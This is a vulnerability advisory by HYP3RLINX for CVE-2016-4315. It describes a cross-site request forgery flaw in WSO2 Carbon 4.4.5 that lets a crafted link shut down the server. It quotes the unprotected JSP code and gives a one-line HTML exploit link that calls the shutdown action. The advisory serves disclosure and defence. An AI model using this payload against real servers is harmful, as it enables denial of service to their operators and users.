@@ -1,0 +1,103 @@
+[+] Credits: John Page aka HYP3RLINX
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/WSO2-CARBON-v4.4.5-CSRF-DOS.txt
+
+[+] ISR: ApparitionSec
+
+
+Vendor:
+============
+www.wso2.com
+
+
+Product:
+==================
+Ws02Carbon v4.4.5
+
+WSO2 Carbon is the core platform on which WSO2 middleware products are built. It is based on Java OSGi technology, which allows
+components to be dynamically installed, started, stopped, updated, and uninstalled, and it eliminates component version conflicts.
+In Carbon, this capability translates into a solid core of common middleware enterprise components, including clustering, security,
+logging, and monitoring, plus the ability to add components for specific features needed to solve a specific enterprise scenario.
+
+
+Vulnerability Type:
+=================================
+Cross Site Request Forgery / DOS
+
+
+CVE Reference:
+==============
+CVE-2016-4315
+
+
+Vulnerability Details:
+=====================
+
+The attack involves tricking a privileged user to initiate a request by clicking a malicious link or visiting an evil webpage to
+shutdown WSO2 Servers.
+
+
+References:
+https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2016-0101
+
+
+The getSafeText() Function and conditional logic below processes the "action" parameter with no check for inbound CSRF attacks.
+
+String cookie = (String) session.getAttribute(ServerConstants.ADMIN_SERVICE_COOKIE);
+String action = CharacterEncoder.getSafeText(request.getParameter("action"));
+ServerAdminClient client = new ServerAdminClient(ctx, backendServerURL, cookie, session);
+
+try {   
+if ("restart".equals(action)) {
+    client.restart();
+ } else if ("restartGracefully".equals(action)) {
+   client.restartGracefully();
+ } else if ("shutdown".equals(action)) {
+     client.shutdown();
+  } else if ("shutdownGracefully".equals(action)) {
+      client.shutdownGracefully();
+    }
+ } catch (Exception e) {
+  response.sendError(500, e.getMessage());
+   return;
+ }
+
+
+
+Exploit code(s):
+===============
+      
+Shutdown the Carbon server
+
+<a href="https://victim-server:9443/carbon/server-admin/proxy_ajaxprocessor.jsp?action=shutdown">Shut it down!</a>
+
+
+Disclosure Timeline:
+==========================================
+Vendor Notification: May 6, 2016
+Vendor Acknowledgement: May 6, 2016
+Vendor Fix / Customer Alerts: June 30, 2016
+August 12, 2016  : Public Disclosure
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+================
+Medium
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere.
+
+HYP3RLINX
